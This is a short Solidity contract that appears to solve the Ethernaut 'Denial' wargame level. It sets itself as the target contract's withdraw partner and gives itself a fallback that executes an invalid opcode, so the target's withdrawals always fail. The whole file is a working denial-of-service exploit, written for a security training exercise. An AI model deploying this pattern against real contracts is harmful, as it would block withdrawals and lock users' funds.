// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Denial.sol';

contract DenialHack {
  address public owner;
  Denial public targetContract;
  constructor() {
    owner = msg.sender;
  }

  function setTarget(address _target) public {
    targetContract = Denial(payable(_target));
    targetContract.setWithdrawPartner(address(this));
  }

  // Tried this with a few different things locally for tests and all failed
  // had to deploy and try submitting for it to pass. 
  fallback() payable external {
    assembly {
      invalid()
    }
  }
  
}
